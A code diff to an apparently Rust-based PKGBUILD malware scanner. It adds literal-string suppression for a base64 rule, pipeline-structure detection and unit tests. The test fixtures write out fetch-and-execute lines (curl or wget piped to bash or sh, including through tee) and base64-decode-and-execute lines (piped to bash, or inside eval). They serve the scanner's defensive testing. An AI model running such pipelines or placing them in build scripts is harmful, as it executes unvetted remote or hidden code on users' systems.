@@ -420,6 +420,18 @@ impl PKGBUILDScanner {
                     continue;
                 }
                 if let Some(m) = rule.regex.find(line) {
+                    // Real shell-structure check (additive precision
+                    // improvement, see src/shellparse.rs): "base64 -d"
+                    // appearing purely inside a string literal (e.g.
+                    // `echo "mentions base64 -d"`) is inert text, not an
+                    // actual decode invocation — don't flag it. A real
+                    // invocation (bare, or inside `$(...)`/backtick command
+                    // substitution) still fires normally.
+                    if rule.id == "OBFUSCATED_BASE64"
+                        && crate::shellparse::is_literal_span(line, m.start(), m.end())
+                    {
+                        continue;
+                    }
                     let matched = m.as_str();
                     let snippet = if matched.len() > 120 {
                         format!("{}...", &matched[..117])
@@ -462,6 +474,10 @@ impl PKGBUILDScanner {
 
         // 5. Recursive Base64 payload de-obfuscation
         findings.extend(crate::analyzer::deobfuscate_and_scan(content, self));
+
+        // 6. Real shell-pipeline-structure detection (fetch-and-execute,
+        // base64-decode-and-execute) — see src/shellparse.rs.
+        findings.extend(crate::analyzer::analyze_pipeline_structure(content));
 
         findings
     }
@@ -931,5 +947,135 @@ package() {
                 .iter()
                 .any(|f| f.rule_id == "SUS_VARIABLE_SPLICING")
         );
+    }
+
+    // --- Real shell-pipeline-structure detection (additive, src/shellparse.rs) ---
+
+    #[test]
+    fn pipeline_detects_curl_piped_to_bash() {
+        let s = test_scanner();
+        let content = "build() {\n  curl -s https://example.com/install.sh | bash\n}\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_detects_wget_dash_o_dash_piped_to_sh() {
+        let s = test_scanner();
+        let content = "prepare() {\n  wget -qO- https://example.com/install.sh | sh\n}\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_detects_multi_stage_curl_tee_bash() {
+        let s = test_scanner();
+        // The old single-regex EXFIL_CURL_PIPE_EXEC only matches curl piped
+        // *directly* into an interpreter; a `tee` stage in between defeats
+        // it. Real pipeline-structure parsing catches this regardless of
+        // how many stages sit between the fetch and the exec.
+        let content =
+            "build() {\n  curl -s https://example.com/install.sh | tee /tmp/x.sh | bash\n}\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_curl_download_to_file_not_flagged_by_pipeline_rule() {
+        let s = test_scanner();
+        // Extremely common, benign PKGBUILD pattern: no pipe at all.
+        let content =
+            "build() {\n  curl -sSL https://example.com/foo.tar.gz -o source.tar.gz\n}\n";
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_curl_remote_name_download_not_flagged() {
+        let s = test_scanner();
+        let content = "build() {\n  curl -sSL -O https://example.com/foo.tar.gz\n}\n";
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_curl_writes_to_file_even_with_pipe_present_not_flagged() {
+        let s = test_scanner();
+        // Pipe character present on the line, but curl's own output goes to
+        // a real file (`-o source.tar.gz`), not into the downstream stage —
+        // the fetch_writes_to_file guard must suppress this.
+        let content =
+            "build() {\n  curl -sSL https://example.com/foo.tar.gz -o source.tar.gz | bash\n}\n";
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_wget_download_to_named_file_not_flagged() {
+        let s = test_scanner();
+        let content = "build() {\n  wget -O source.tar.gz https://example.com/foo.tar.gz\n}\n";
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_source_array_entry_not_flagged() {
+        let s = test_scanner();
+        let content = r#"pkgname=foo
+pkgver=1.0
+source=("https://example.com/foo-${pkgver}.tar.gz")
+sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')
+"#;
+        let findings = s.scan(content, Some("foo"));
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_comment_mentioning_curl_and_bash_not_flagged() {
+        let s = test_scanner();
+        let content =
+            "# example: curl https://example.com/install.sh | bash (do NOT do this)\nbuild() {\n  true\n}\n";
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_FETCH_EXEC"));
+    }
+
+    #[test]
+    fn pipeline_detects_base64_decode_piped_to_bash() {
+        let s = test_scanner();
+        let content = "prepare() {\n  echo \"$PAYLOAD\" | base64 -d | bash\n}\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
+        // The old, coarser regex signature should still fire too (additive,
+        // not replacing).
+        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
+    }
+
+    #[test]
+    fn base64_mentioned_in_echo_string_literal_not_flagged() {
+        let s = test_scanner();
+        // Vision section 6's explicit example: a string literal that merely
+        // *mentions* base64 -d is harmless, not an obfuscated-execution
+        // pipeline. The precise, structurally-aware rule must not fire, and
+        // the refined OBFUSCATED_BASE64 application (context-checked via
+        // src/shellparse.rs) must not fire either.
+        let content = r#"pkgnote() {
+  echo "note: you could manually run base64 -d on the payload if you wanted"
+}
+"#;
+        let findings = s.scan(content, None);
+        assert!(!findings.iter().any(|f| f.rule_id == "PIPELINE_BASE64_EXEC"));
+        assert!(!findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
+    }
+
+    #[test]
+    fn base64_decode_inside_command_substitution_still_flagged() {
+        let s = test_scanner();
+        // Real execution context even though it's inside double quotes:
+        // `$(...)` still runs. Must not be suppressed by the literal-text
+        // refinement.
+        let content = "eval \"$(echo $PAYLOAD | base64 -d)\"\n";
+        let findings = s.scan(content, None);
+        assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_BASE64"));
     }
 }
